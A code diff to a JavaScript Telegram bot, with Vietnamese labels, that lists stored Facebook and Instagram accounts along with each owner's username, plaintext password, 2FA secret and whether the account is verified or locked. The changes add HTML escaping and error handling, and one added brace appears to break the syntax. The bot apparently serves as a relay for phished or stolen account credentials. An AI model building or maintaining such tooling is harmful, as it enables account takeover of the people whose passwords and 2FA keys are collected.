@@ -265,6 +265,14 @@ const defaultReplyKeyboard = {
   persistent: true
 };
 
+function escapeHtml(str) {
+  if (!str) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
 async function handleTelegramMessage(msg) {
   const chatId = msg.chat.id;
   const text = (msg.text || '').trim();
@@ -299,11 +307,16 @@ async function handleTelegramMessage(msg) {
       verifiedDocs.forEach((doc, idx) => {
         const r = doc.data();
         const typeLabel = r.accountType === 'facebook' ? 'Facebook' : 'Instagram';
-        message += `<b>${idx + 1}. ${typeLabel}: @${r.instagramUsername}</b>\n` +
-          `• Họ tên: <b>${r.displayName || 'N/A'}</b>\n` +
-          `• User: <code>${r.instagramUsername}</code>\n` +
-          `• Pass: <code>${r.password || 'N/A'}</code>\n` +
-          `• 2FA: <code>${r.twoFactorKey || 'N/A'}</code>\n` +
+        const userClean = escapeHtml(r.instagramUsername);
+        const passClean = escapeHtml(r.password || 'N/A');
+        const twoFaClean = escapeHtml(r.twoFactorKey || 'N/A');
+        const nameClean = escapeHtml(r.displayName || 'N/A');
+
+        message += `<b>${idx + 1}. ${typeLabel}: @${userClean}</b>\n` +
+          `• Họ tên: <b>${nameClean}</b>\n` +
+          `• User: <code>${userClean}</code>\n` +
+          `• Pass: <code>${passClean}</code>\n` +
+          `• 2FA: <code>${twoFaClean}</code>\n` +
           `• Trạng thái: 💙 <b>TÍCH XANH</b>\n\n`;
       });
 
@@ -329,9 +342,12 @@ async function handleTelegramMessage(msg) {
       deadDocs.forEach((doc, idx) => {
         const r = doc.data();
         const typeLabel = r.accountType === 'facebook' ? 'Facebook' : 'Instagram';
-        message += `<b>${idx + 1}. ${typeLabel}: @${r.instagramUsername}</b>\n` +
-          `• Họ tên: <b>${r.displayName || 'N/A'}</b>\n` +
-          `• User: <code>${r.instagramUsername}</code>\n` +
+        const userClean = escapeHtml(r.instagramUsername);
+        const nameClean = escapeHtml(r.displayName || 'N/A');
+
+        message += `<b>${idx + 1}. ${typeLabel}: @${userClean}</b>\n` +
+          `• Họ tên: <b>${nameClean}</b>\n` +
+          `• User: <code>${userClean}</code>\n` +
           `• Trạng thái: 🔴 <b>BỊ DIE / KHÓA</b>\n\n`;
       });
 
@@ -358,9 +374,11 @@ async function handleTelegramMessage(msg) {
         const r = doc.data();
         const typeLabel = r.accountType === 'facebook' ? 'Facebook' : 'Instagram';
         const statusIcon = r.isVerified ? '💙 TÍCH XANH' : r.accountStatus === 'dead' ? '🔴 DIE' : '✅ LIVE';
+        const userClean = escapeHtml(r.instagramUsername);
+        const nameClean = escapeHtml(r.displayName || 'N/A');
 
-        message += `<b>${idx + 1}. ${typeLabel}: @${r.instagramUsername}</b>\n` +
-          `• Họ tên: ${r.displayName || 'N/A'}\n` +
+        message += `<b>${idx + 1}. ${typeLabel}: @${userClean}</b>\n` +
+          `• Họ tên: ${nameClean}\n` +
           `• Trạng thái: <b>${statusIcon}</b>\n\n`;
       });
 
@@ -387,10 +405,15 @@ async function pollTelegramUpdates() {
     const updates = response.data.result || [];
     for (const update of updates) {
       lastUpdateId = Math.max(lastUpdateId, update.update_id);
-      if (update.message && update.message.text) {
-        await handleTelegramMessage(update.message);
+      try {
+        if (update.message && update.message.text) {
+          await handleTelegramMessage(update.message);
+        }
+      } catch (err) {
+        console.error(`Error handling update ${update.update_id}:`, err?.message || err);
       }
     }
+  }
   } catch (e) {
     const errStr = String(e?.message || e || '');
     if (!errStr.includes('timeout') && !errStr.includes('ECONNABORTED')) {
